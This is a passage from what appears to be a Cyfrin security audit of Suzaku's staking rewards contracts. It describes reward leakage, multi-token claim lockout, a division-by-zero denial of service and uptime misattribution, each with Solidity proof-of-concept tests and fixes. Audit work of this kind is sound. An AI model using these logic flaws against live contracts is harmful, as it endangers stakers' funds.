        (, uint256 additionalMinted) = _deposit(staker, 500 ether);

        // Now allocate more of this deposited stake to Alice (the operator)
        uint256 totalAliceShares = mintedShares + additionalMinted;
        _setL1Limit(bob, validatorManagerAddress, assetClassId, 3000 ether, delegator);
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, alice, totalAliceShares, delegator);

        // Move to next epoch to make the new stake available
        epoch = _calcAndWarpOneEpoch();

        // Verify Alice now has sufficient available stake
        uint256 aliceAvailableStake = middleware.getOperatorAvailableStake(alice);
        console2.log("Alice available stake: %s ETH", aliceAvailableStake / 1 ether);

        // Alice adds a node with 10 ETH stake
        (bytes32[] memory nodeIds, bytes32[] memory validationIDs,) =
            _createAndConfirmNodes(alice, 1, 10 ether, true);
        bytes32 nodeId = nodeIds[0];
        bytes32 validationID = validationIDs[0];

        // Move to next epoch and confirm initial state
        epoch = _calcAndWarpOneEpoch();
        uint256 initialStake = middleware.getNodeStake(epoch, validationID);
        assertEq(initialStake, 10 ether, "Initial stake should be 10 ETH");

        // Alice increases stake to 1000 ETH (10x increase)
        uint256 modifiedStake = 50 ether;
        vm.prank(alice);
        middleware.initializeValidatorStakeUpdate(nodeId, modifiedStake);

        // Check: Stake cache immediately updated for next epoch (unconfirmed!)
        uint48 nextEpoch = middleware.getCurrentEpoch() + 1;
        uint256 unconfirmedStake = middleware.nodeStakeCache(nextEpoch, validationID);
        assertEq(unconfirmedStake, modifiedStake, "Unconfirmed stake should be immediately set");

        // Verify: P-Chain operation is still pending
        assertTrue(
            mockValidatorManager.isValidatorPendingWeightUpdate(validationID),
            "P-Chain operation should still be pending"
        );

        // Move to next epoch (when unconfirmed stake takes effect)
        epoch = _calcAndWarpOneEpoch();

        // Reward calculations now use unconfirmed 1000 ETH stake
        uint256 operatorStakeForRewards = middleware.getOperatorUsedStakeCachedPerEpoch(
            epoch, alice, middleware.PRIMARY_ASSET_CLASS()
        );
        assertEq(
            operatorStakeForRewards,
            modifiedStake,
            "Reward calculations should use unconfirmed 500 ETH stake"
        );
        console2.log("Stake used for rewards: %s ETH", operatorStakeForRewards / 1 ether);
    }
```

**Recommended Mitigation:** Consider updating the stake cache only after P-Chain confirmation rather than during initialization:

```solidity
function completeStakeUpdate(bytes32 nodeId, uint32 messageIndex) external {
    // ... existing logic ...

    // Update cache only after P-Chain confirms
    uint48 currentEpoch = getCurrentEpoch();
    nodeStakeCache[currentEpoch + 1][validationID] = validator.weight;
}
```
Note that this change also requires changes in `_calcAndCacheNodeStakeForOperatorAtEpoch` - currently the `nodeStakeCache` of current epoch is updated to the one in previous epoch, only when there are no pending updates. If the above change is implemented, `nodeStakeCache` for current epoch should **always be** the one rolled over from previous epochs.

**Suzaku:**
Fixed in commit [5157351](https://github.com/suzaku-network/suzaku-core/pull/155/commits/5157351d0e9a799679a74c33c6b69aa87d58ab51).

**Cyfrin:** Verified.


### Vault rewards incorrectly scaled by cross-asset-class operator totals instead of asset class specific shares causing rewards leakage

**Description:** The current vault reward distribution logic causes systematic under-distribution of rewards to vault stakers. The issue stems from using cross-asset-class operator beneficiary share totals to scale individual vault rewards, instead of using asset-class-specific operator rewards. This causes a leakage of rewards in scenarios where operators have assymetric stake across different asset class IDs.

The `Rewards::_calculateAndStoreVaultShares` function incorrectly uses `operatorBeneficiariesShares[operator]` (which represents the operator's total rewards across ALL asset classes) to scale rewards for individual vaults that belong to specific asset classes. This creates an inappropriate dilution effect where vault rewards are scaled down by the operator's participation in other unrelated asset classes.

 First in `_calculateOperatorShare()` when calculating the operator's total share

```solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    // ... uptime calculations ...

    uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
    for (uint256 i = 0; i < assetClasses.length; i++) {
        uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
        uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
        uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];

        uint256 shareForClass = Math.mulDiv(
            Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake),
            assetClassShare, // @audit asset class share applied here
            BASIS_POINTS_DENOMINATOR
        );
        totalShare += shareForClass;
    }
    // ... rest of function
    operatorBeneficiariesShares[epoch][operator] = totalShare; //@audit this is storing cross-asset total
```


Again in `_calculateAndStoreVaultShares()`, `operatorBeneficiariesShares` which is a cross-asset operator share is used to calculate vault share for a specific vault:

```solidity
function _calculateAndStoreVaultShares(uint48 epoch, address operator) internal {
    uint256 operatorShare = operatorBeneficiariesShares[epoch][operator]; // @audit already includes asset class weighting

    for (uint256 i = 0; i < vaults.length; i++) {
        address vault = vaults[i];
        uint96 vaultAssetClass = middlewareVaultManager.getVaultAssetClass(vault);

        // ... vault stake calculation ...

        uint256 vaultShare = Math.mulDiv(vaultStake, BASIS_POINTS_DENOMINATOR, operatorActiveStake);
        vaultShare = Math.mulDiv(vaultShare, rewardsSharePerAssetClass[vaultAssetClass], BASIS_POINTS_DENOMINATOR);
        vaultShare = Math.mulDiv(vaultShare, operatorShare, BASIS_POINTS_DENOMINATOR);
        //@audit Uses cross-asset operator total instead of asset-class-specific share
        // This scales vault rewards by operator's participation in OTHER asset classes
        // ... rest of function
    }
}
```

Net effect is, even if a specific operator contributes 100% of the vault stake, it gets scaled by the global operator share causing a leakage in rewards for that specific asset class.

**Impact:** Systematic under-rewards in every epoch where vault stakes receive less than what they should, and this excess is being reclaimed as undistributed rewards. Effectively, the actual reward distribution doesn't match intended asset class allocations.

**Proof of Concept:** The test demonstrates that even when all fees are zero, the vault share is only 92.5% of the epoch rewards. The 7.5% is attributed to the reward leakage that becomes part of undistributed rewards.

```text
  In the POC below,
- Asset Class 1: 50% share (5000 bp), 1000 total stake
- Asset Class 2: 20% share (2000 bp), 100 total stake
- Asset Class 3: 30% share (3000 bp), 100 total stake
- Operator B: 700/100/100 stake in classes 1/2/3 respectively
- Operator B's cross-asset total: (700/10005000) + (100/1002000) + (100/1003000) = 8500 bp
- Vault Share of Asset ID 2:
    - vaultShare = (100/100)  2000  8500 / (10000  10000)
    - vaultShare = 1  2000  8500 / 100,000,000 = 1700 bp

Vault 2 should get Operator B's Asset Class 2 rewards only (2000 bp)
Instead, it gets scaled by operator's total across all classes (8500 bp)

This causes a dilution of 300 bp

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {MockAvalancheL1Middleware} from "../mocks/MockAvalancheL1Middleware.sol";
import {MockUptimeTracker} from "../mocks/MockUptimeTracker.sol";
import {MockVaultManager} from "../mocks/MockVaultManager.sol";
import {MockDelegator} from "../mocks/MockDelegator.sol";
import {MockVault} from "../mocks/MockVault.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

import {Rewards} from "../../src/contracts/rewards/Rewards.sol";
import {IRewards} from "../../src/interfaces/rewards/IRewards.sol";
import {BaseDelegator} from "../../src/contracts/delegator/BaseDelegator.sol";
import {IVaultTokenized} from "../../src/interfaces/vault/IVaultTokenized.sol";

contract RewardsAssetShareTest is Test {
    // Contracts
    MockAvalancheL1Middleware public middleware;
    MockUptimeTracker public uptimeTracker;
    MockVaultManager public vaultManager;
    Rewards public rewards;
    ERC20Mock public rewardsToken;

    // Test addresses
    address constant ADMIN = address(0x1);
    address constant PROTOCOL_OWNER = address(0x2);
    address constant REWARDS_MANAGER = address(0x3);
    address constant REWARDS_DISTRIBUTOR = address(0x4);
    address constant OPERATOR_A = address(0x1000);
    address constant OPERATOR_B = address(uint160(0x1000 + 1));

    function setUp() public {
        // Deploy mock contracts - simplified setup for our POC
        vaultManager = new MockVaultManager();

        //Set up 2 operators
        uint256[] memory nodesPerOperator = new uint256[](2);
        nodesPerOperator[0] = 1; // Operator 0x1000 has 1 node
        nodesPerOperator[1] = 1; // Operator A has 1 node

        middleware = new MockAvalancheL1Middleware(
            2,
            nodesPerOperator,
            address(0),
            address(vaultManager)
        );

        uptimeTracker = new MockUptimeTracker();

        // Deploy Rewards contract
        rewards = new Rewards();
        rewardsToken = new ERC20Mock();

        // Initialize with no fees to match our simplified example
        rewards.initialize(
            ADMIN,
            PROTOCOL_OWNER,
            payable(address(middleware)),
            address(uptimeTracker),
            0, // protocolFee = 0%
            0, // operatorFee = 0%
            0, // curatorFee = 0%
            0  // minRequiredUptime = 0
        );

        // Set up roles
        vm.prank(ADMIN);
        rewards.setRewardsManagerRole(REWARDS_MANAGER);

        vm.prank(REWARDS_MANAGER);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR);

        // Set up rewards token
        rewardsToken.mint(REWARDS_DISTRIBUTOR, 1_000_000 * 10**18);
        vm.prank(REWARDS_DISTRIBUTOR);
        rewardsToken.approve(address(rewards), 1_000_000 * 10**18);
    }

    function test_AssetShareFormula() public {
        uint48 epoch = 1;

        // Set Asset Class 1 to 50% rewards share (5000 basis points)
        vm.prank(REWARDS_MANAGER);
        rewards.setRewardsShareForAssetClass(1, 5000); // 50%

        vm.prank(REWARDS_MANAGER);
        rewards.setRewardsShareForAssetClass(2, 2000); // 20%

        vm.prank(REWARDS_MANAGER);
        rewards.setRewardsShareForAssetClass(3, 3000); // 30%

        // Set total stake in Asset Class 1 = 1000 tokens across network
        middleware.setTotalStakeCache(epoch, 1, 1000);
        middleware.setTotalStakeCache(epoch, 2, 100);  // Asset Class 2: 0 tokens
        middleware.setTotalStakeCache(epoch, 3, 100);  // Asset Class 3: 0 tokens

        // Set Operator A stake = 300 tokens (30% of network)
        middleware.setOperatorStake(epoch, OPERATOR_A, 1, 300);

        // Set operator A node stake (for primary asset class calculation)
        bytes32[] memory operatorNodes = middleware.getOperatorNodes(OPERATOR_A);
        middleware.setNodeStake(epoch, operatorNodes[0], 300);

        // No stake in other asset classes for Operator A
        middleware.setOperatorStake(epoch, OPERATOR_A, 2, 0);
        middleware.setOperatorStake(epoch, OPERATOR_A, 3, 0);

        bytes32[] memory operatorBNodes = middleware.getOperatorNodes(OPERATOR_B);
        middleware.setNodeStake(epoch, operatorBNodes[0], 700); // Remaining Asset Class 1 stake
        middleware.setOperatorStake(epoch, OPERATOR_B, 1, 700);
        middleware.setOperatorStake(epoch, OPERATOR_B, 2, 100);
        middleware.setOperatorStake(epoch, OPERATOR_B, 3, 100);

        // Set 100% uptime for Operator A & B
        uptimeTracker.setOperatorUptimePerEpoch(epoch, OPERATOR_A, 4 hours);
        uptimeTracker.setOperatorUptimePerEpoch(epoch, OPERATOR_B, 4 hours);


        // Create a vault for Asset Class 1 with 300 tokens staked (100% of operator's stake)
        address vault1Owner = address(0x500);
        (address vault1, address delegator1) = vaultManager.deployAndAddVault(
            address(0x123), // collateral
            vault1Owner
        );
        middleware.setAssetInAssetClass(1, vault1);
        vaultManager.setVaultAssetClass(vault1, 1);

          // Create vault for Asset Class 2
        address vault2Owner = address(0x600);
        (address vault2, address delegator2) = vaultManager.deployAndAddVault(address(0x123), vault2Owner);
        middleware.setAssetInAssetClass(2, vault2);
        vaultManager.setVaultAssetClass(vault2, 2);

        // Create vault for Asset Class 3
        address vault3Owner = address(0x700);
        (address vault3, address delegator3) = vaultManager.deployAndAddVault(
            address(0x125), // different collateral
            vault3Owner
        );
        middleware.setAssetInAssetClass(3, vault3);
        vaultManager.setVaultAssetClass(vault3, 3);


        // Set vault delegation: 300 tokens staked to Operator A
        uint256 epochTs = middleware.getEpochStartTs(epoch);
        MockDelegator(delegator1).setStake(
            middleware.L1_VALIDATOR_MANAGER(),
            1, // asset class
            OPERATOR_A,
            uint48(epochTs),
            300 // stake amount
        );

        MockDelegator(delegator1).setStake(middleware.L1_VALIDATOR_MANAGER(),
                                            1,
                                            OPERATOR_B,
                                            uint48(epochTs),
                                            700);

        MockDelegator(delegator2).setStake(
            middleware.L1_VALIDATOR_MANAGER(), 2, OPERATOR_B, uint48(epochTs), 100
        );

        MockDelegator(delegator3).setStake(
            middleware.L1_VALIDATOR_MANAGER(), 3, OPERATOR_B, uint48(epochTs), 100
        );

        // Set rewards for the epoch: 100,000 tokens
        vm.prank(REWARDS_DISTRIBUTOR);
        rewards.setRewardsAmountForEpochs(epoch, 1, address(rewardsToken), 100_000);


        // Wait 3 epochs as required by contract
        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());

        // Distribute rewards
        vm.prank(REWARDS_DISTRIBUTOR);
        rewards.distributeRewards(epoch, 2);

        // Get calculated shares
        uint256 operatorABeneficiariesShare = rewards.operatorBeneficiariesShares(epoch, OPERATOR_A);
        uint256 operatorBBeneficiariesShare = rewards.operatorBeneficiariesShares(epoch, OPERATOR_B);

        uint256 vault1Share = rewards.vaultShares(epoch, vault1);
        uint256 vault2Share = rewards.vaultShares(epoch, vault2);
        uint256 vault3Share = rewards.vaultShares(epoch, vault3);

        console2.log("=== RESULTS ===");
        console2.log("operatorBeneficiariesShares[OPERATOR_A] =", operatorABeneficiariesShare, "basis points");
        console2.log("vaultShares[vault_1] =", vault1Share, "basis points");
        console2.log("operatorBeneficiariesShares[OPERATOR_B] =", operatorBBeneficiariesShare, "basis points");
        console2.log("vaultShares[vault_2] =", vault2Share, "basis points");
        console2.log("vaultShares[vault_3] =", vault3Share, "basis points");

        // Expected: 30% stake * 50% asset class = 15% = 1500 basis points
        assertEq(operatorABeneficiariesShare, 1500,
            "Operator share should be 1500 basis points (15%)");
        assertEq(vault1Share, 5000,
            "Vault share should be 5000 basis points (7.5% + 42.5)");

        assertEq(operatorBBeneficiariesShare, 8500,
            "Operator share should be 9500 basis points (85%)"); //  (700/1000)  50%  +  (100/100)  20%  + (100/100)  30% = 85%
        assertEq(vault2Share, 1700,
            "Vault share should be 1700 basis points (19%)");
            // vaultShare = (100 / 100)  10,000 = 10,000 bp
            // vaultShare = 10,000  2,000 / 10,000 = 2,000 bp (vaultShare * assetClassShare / 10000)
            // vaultShare = 2,000  8,500 / 10,000 = 1,700 bp (vaultShare * operatorShare / 10000)

         assertEq(vault3Share, 2550,
            "Vault share should be 2550 basis points (28.5%)");
            // vaultShare = (100 / 100)  10,000 = 10,000 bp
            // vaultShare = 10,000  3,000/10,000 = 3,000 bp (vaultShare * assetClassShare / 10000)
            // vaultShare = 3,000  8,500/10,000 = 2,550 bp (vaultShare * operatorShare / 10000)


    }
}
```

**Recommended Mitigation:** Consider implementing a per-asset class operator shares instead of total operator shares. The `operatorBeneficiariesShare` should be more granular and asset-id specific to prevent this leakage. Corresponding logic in `_calculateOperatorShare` and `_calculateAndStoreVaultShares` should be adjusted specific to each assetID.

```solidity
// Add per-asset-class tracking
mapping(uint48 epoch => mapping(address operator => mapping(uint96 assetClass => uint256 share)))
    public operatorBeneficiariesSharesPerAssetClass;
```

**Suzaku:**
Fixed in commit [f9bfdf7](https://github.com/suzaku-network/suzaku-core/pull/155/commits/f9bfdf7faa7023a0e662280a34cb41be145ba7ab).

**Cyfrin:** Verified.


### Not all reward token rewards are claimable

**Description:** The `lastEpochClaimedStaker`, `lastEpochClaimedCurator` and `lastEpochClaimedOperator` mappings in the `Rewards` contract track the last epoch for which a staker/curator/operator has claimed rewards, but it is keyed only by the staker's/curator's/operator's address and not by the reward token. This means that when a staker/curator/operator claims rewards for a given epoch and reward token, the contract updates the mappings for all tokens, not just the one claimed. As a result, if a staker/curator/operator is eligible for rewards from multiple tokens for the same epoch(s), claiming rewards for one token will prevent them from claiming rewards for the others for those epochs.

**Impact:** Stakers/curators/operators who are eligible to receive rewards in multiple tokens for the same epoch(s) will only be able to claim rewards for one token. Once they claim for one token, the contract will mark all those epochs as claimed, making it impossible to claim the rewards for the other tokens. This leads to loss of rewards for stakers/curators/operators and breaks the expected behavior of multi-token reward distribution.

**Proof of Concept:**
1. Change the `_setupStakes` function in the `RewardsTest.t.sol` file:
```solidity
// Sets up stakes for all operators in a given epoch
function _setupStakes(uint48 epoch, uint256 uptime) internal {
	address[] memory operators = middleware.getAllOperators();
	uint256 timestamp = middleware.getEpochStartTs(epoch);

	// Define operator stake percentages (must sum to 100%)
	uint256[] memory operatorPercentages = new uint256[](10);
	operatorPercentages[0] = 10;
	operatorPercentages[1] = 10;
	operatorPercentages[2] = 10;
	operatorPercentages[3] = 10;
	operatorPercentages[4] = 10;
	operatorPercentages[5] = 10;
	operatorPercentages[6] = 10;
	operatorPercentages[7] = 10;
	operatorPercentages[8] = 10;
	operatorPercentages[9] = 10;

	uint256 totalStakePerClass = 3_000_000 ether;

	// Track total stakes for each asset class
	uint256[] memory totalStakes = new uint256[](3); // [primary, secondary1, secondary2]

	for (uint256 i = 0; i < operators.length; i++) {
		address operator = operators[i];
		uint256 operatorStake = (totalStakePerClass * operatorPercentages[i]) / 100;
		uint256 stakePerNode = operatorStake / middleware.getOperatorNodes(operator).length;

		_setupOperatorStakes(epoch, operator, operatorStake, stakePerNode, totalStakes);
		_setupVaultDelegations(epoch, operator, operatorStake, timestamp);
		uptimeTracker.setOperatorUptimePerEpoch(epoch, operator, uptime);
	}

	// Set total stakes in L1 middleware
	middleware.setTotalStakeCache(epoch, 1, totalStakes[0]);
	middleware.setTotalStakeCache(epoch, 2, totalStakes[1]);
	middleware.setTotalStakeCache(epoch, 3, totalStakes[2]);
}

// Sets up stakes for a single operator's nodes and asset classes
function _setupOperatorStakes(
	uint48 epoch,
	address operator,
	uint256 operatorStake,
	uint256 stakePerNode,
	uint256[] memory totalStakes
) internal {
	bytes32[] memory operatorNodes = middleware.getOperatorNodes(operator);
	for (uint256 j = 0; j < operatorNodes.length; j++) {
		middleware.setNodeStake(epoch, operatorNodes[j], stakePerNode);
		totalStakes[0] += stakePerNode; // Primary stake
	}
	middleware.setOperatorStake(epoch, operator, 2, operatorStake);
	middleware.setOperatorStake(epoch, operator, 3, operatorStake);
	totalStakes[1] += operatorStake; // Secondary stake 1
	totalStakes[2] += operatorStake; // Secondary stake 2
}

// Sets up vault delegations for a single operator
function _setupVaultDelegations(
	uint48 epoch,
	address operator,
	uint256 operatorStake,
	uint256 timestamp
) internal {
	for (uint256 j = 0; j < delegators.length; j++) {
		delegators[j].setStake(
			middleware.L1_VALIDATOR_MANAGER(),
			uint96(j + 1),
			operator,
			uint48(timestamp),
			operatorStake
		);
	}
}
```

2. Add the following tests to the `RewardsTest.t.sol` file:
```solidity
function test_claimRewards_multipleTokens_staker() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);
	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Setup staker
	address staker = makeAddr("Staker");
	address vault = vaultManager.vaults(0);
	uint256 epochTs = middleware.getEpochStartTs(startEpoch);
	MockVault(vault).setActiveBalance(staker, 300_000 * 1e18);
	MockVault(vault).setTotalActiveShares(uint48(epochTs), 400_000 * 1e18);

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	// Claim for rewardsToken (should succeed)
	vm.prank(staker);
	rewards.claimRewards(address(rewardsToken), staker);
	assertGt(rewardsToken.balanceOf(staker), 0, "Staker should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(staker);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, staker, numberOfEpochs));
	rewards.claimRewards(address(rewardsToken2), staker);
}

function test_claimOperatorFee_multipleTokens_operator() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);

	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	address operator = middleware.getAllOperators()[0];

	// Claim for rewardsToken (should succeed)
	vm.prank(operator);
	rewards.claimOperatorFee(address(rewardsToken), operator);
	assertGt(rewardsToken.balanceOf(operator), 0, "Operator should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(operator);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, operator, numberOfEpochs));
	rewards.claimOperatorFee(address(rewardsToken2), operator);
}

function test_claimCuratorFee_multipleTokens_curator() public {
	// Deploy a second reward token
	ERC20Mock rewardsToken2 = new ERC20Mock();
	rewardsToken2.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 10 ** 18);
	vm.prank(REWARDS_DISTRIBUTOR_ROLE);
	rewardsToken2.approve(address(rewards), 1_000_000 * 10 ** 18);

	uint48 startEpoch = 1;
	uint48 numberOfEpochs = 3;
	uint256 rewardsAmount = 100_000 * 10 ** 18;

	// Set rewards for both tokens
	vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
	rewards.setRewardsAmountForEpochs(startEpoch, numberOfEpochs, address(rewardsToken2), rewardsAmount);
	vm.stopPrank();

	// Distribute rewards for epochs 1 to 3
	for (uint48 epoch = startEpoch; epoch < startEpoch + numberOfEpochs; epoch++) {
		_setupStakes(epoch, 4 hours);
		vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
		address[] memory operators = middleware.getAllOperators();
		vm.prank(REWARDS_DISTRIBUTOR_ROLE);
		rewards.distributeRewards(epoch, uint48(operators.length));
	}

	// Warp to epoch 4
	vm.warp((startEpoch + numberOfEpochs) * middleware.EPOCH_DURATION());

	address vault = vaultManager.vaults(0);
	address curator = MockVault(vault).owner();

	// Claim for rewardsToken (should succeed)
	vm.prank(curator);
	rewards.claimCuratorFee(address(rewardsToken), curator);
	assertGt(rewardsToken.balanceOf(curator), 0, "Curator should receive rewardsToken");

	// Try to claim for rewardsToken2 (should revert)
	vm.prank(curator);
	vm.expectRevert(abi.encodeWithSelector(IRewards.AlreadyClaimedForLatestEpoch.selector, curator, numberOfEpochs));
	rewards.claimCuratorFee(address(rewardsToken2), curator);
}
```

**Recommended Mitigation:** Change the `lastEpochClaimedStaker`, `lastEpochClaimedCurator` and `lastEpochClaimedOperator` mappings to be keyed by both the user address and the reward token, for example:

```solidity
mapping(address staker => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedStaker;
mapping(address curator => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedCurator;
mapping(address operator => mapping(address rewardToken => uint48 epoch)) public lastEpochClaimedOperator;
```

Update all relevant logic in the`claimRewards`function and elsewhere to use this new mapping structure, ensuring that claims are tracked separately for each reward token.

**Suzaku:**
Fixed in commit [43e09e6](https://github.com/suzaku-network/suzaku-core/pull/155/commits/43e09e66272b72b89e329403b10b0160938ad3b0).

**Cyfrin:** Verified.


### Division by zero in rewards distribution can cause permanent lock of epoch rewards

**Description:** In the `Rewards::_calculateOperatorShare()` function, the system fetches the current list of asset classes but attempts to calculate rewards for a historical epoch:

```solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
    // ... uptime checks ...

    uint96[] memory assetClasses = l1Middleware.getAssetClassIds(); // @audit Gets CURRENT asset classes
    for (uint256 i = 0; i < assetClasses.length; i++) {
        uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
        uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); // @audit past epoch
        uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];

        uint256 shareForClass = Math.mulDiv(
            Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake), //  DIVISION BY ZERO
            assetClassShare,
            BASIS_POINTS_DENOMINATOR
        );
        totalShare += shareForClass;
    }
}
```

 This creates a mismatch where:

- Deactivated asset classes remain in the returned array but have zero total stake
- Newly added asset classes are included but have no historical stake data for past epochs
- Asset classes with zero stake for any reason cause division by zero

Consider following scenario:

```text
- Epoch N: Normal operations, operators earn rewards, rewards distribution pending
- Epoch N+1: Protocol admin legitimately adds a new asset class for future growth
- Epoch N+2: New asset class is activated and configured with rewards share
- Epoch N+3: When attempting to distribute rewards for Epoch N, the system:

- Fetches current asset classes (including the new one)
- Attempts to get totalStakeCache[N][newAssetClass] which is 0
- Triggers division by zero in Math.mulDiv(), causing transaction revert
```

Similar division by zero checks are also missing in `_calculateAndStoreVaultShares` when `operatorActiveStake == 0`.


**Impact:** Adding a new asset class ID, deactivating or migrating an existing asset class ID or simply having zero stake for a specific assetClassId (though unlikely with minimum stake requirement but this is not enforced actively) are all instances where reward distribution can be permanently DOSed for a specific epoch.


**Proof of Concept:** Note: Test needs following changes to `MockAvalancheL1Middleware.sol`:

```solidity
 uint96[] private assetClassIds = [1, 2, 3]; // Initialize with default asset classes

    function setAssetClassIds(uint96[] memory newAssetClassIds) external {
        // Clear existing array
        delete assetClassIds;

        // Copy new asset class IDs
        for (uint256 i = 0; i < newAssetClassIds.length; i++) {
            assetClassIds.push(newAssetClassIds[i]);
        }
    }

    function getAssetClassIds() external view returns (uint96[] memory) {
        return assetClassIds;
    }  //@audit this function is overwritten
```

Copy following test to `RewardsTest.t.sol`:

```solidity
    function test_RewardsDistribution_DivisionByZero_NewAssetClass() public {
    uint48 epoch = 1;
    _setupStakes(epoch, 4 hours);

    vm.warp((epoch + 1) * middleware.EPOCH_DURATION());

    // Add a new asset class (4) after epoch 1 has passed
    uint96 newAssetClass = 4;
    uint96[] memory currentAssetClasses = middleware.getAssetClassIds();
    uint96[] memory newAssetClasses = new uint96[](currentAssetClasses.length + 1);
    for (uint256 i = 0; i < currentAssetClasses.length; i++) {
        newAssetClasses[i] = currentAssetClasses[i];
    }
    newAssetClasses[currentAssetClasses.length] = newAssetClass;

    // Update the middleware to return the new asset class list
    middleware.setAssetClassIds(newAssetClasses);

    // Set rewards share for the new asset class
    vm.prank(REWARDS_MANAGER_ROLE);
    rewards.setRewardsShareForAssetClass(newAssetClass, 1000); // 10%

     // distribute rewards
     vm.warp((epoch + 2) * middleware.EPOCH_DURATION());
    assertEq(middleware.totalStakeCache(epoch, newAssetClass), 0, "New asset class should have zero stake for historical epoch 1");

    vm.prank(REWARDS_DISTRIBUTOR_ROLE);
    vm.expectRevert(); // Division by zero in Math.mulDiv when totalStake = 0
    rewards.distributeRewards(epoch, 1);
}
```

**Recommended Mitigation:** Consider adding division by zero checks and simply move to the next asset if `total stake == 0` for a given assetClassId. Also add zero checks to `operatorActiveStake == 0` when calculating `vaultShare`

**Suzaku:**
Fixed in commit [9ac7bf0](https://github.com/suzaku-network/suzaku-core/pull/155/commits/9ac7bf0dc8071b42e4621d453d52227cfc27a03f).

**Cyfrin:** Verified.


### Inaccurate uptime distribution in `UptimeTracker::computeValidatorUptime` leads to reward discrepancies

**Description:** The `UptimeTracker::computeValidatorUptime` function calculates a validator's uptime by evenly distributing the total recorded uptime across all epochs between the last checkpoint and the current epoch. However, it does not verify whether the validator was actually active during each of those epochs. As a result, uptime may be incorrectly attributed to epochs where the validator was offline or inactive.

This flaw becomes significant when the uptime data is used by the `Rewards` contract to determine validator rewards. Since reward values can differ substantially between epochs, attributing uptime to the wrong epochs can misrepresent a validator's actual contribution. For instance, if a validator was active for 4 hours in epoch 2 (which has a higher reward rate) but the uptime is split equally between epoch 1 (lower rewards) and epoch 2, the validators reward calculation will not reflect their true activity, leading to inaccurate reward distribution.

**Impact:**
- **Financial Loss for Validators:** Validators may receive fewer rewards than they deserve if their uptime is credited to epochs with lower reward rates instead of the epochs where they were genuinely active.
- **Unfair Reward Distribution:** The system could inadvertently reward validators for epochs in which they were not active, potentially encouraging exploitative behavior or penalizing honest participants.
- **Reduced System Integrity:** Inaccurate uptime tracking erodes trust in the reward mechanism, as validators and users may question the fairness and reliability of the platform.

**Proof of Concept:**
1. Add the following lines to the `MockWarpMessenger.sol` file:
```diff
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.25;

import {
    IWarpMessenger,
    WarpMessage,
    WarpBlockHash
} from "@avalabs/subnet-evm-contracts@1.2.0/contracts/interfaces/IWarpMessenger.sol";
import {ValidatorMessages} from "@avalabs/icm-contracts/validator-manager/ValidatorMessages.sol";

contract MockWarpMessenger is IWarpMessenger {
    // Constants for uptime values from tests
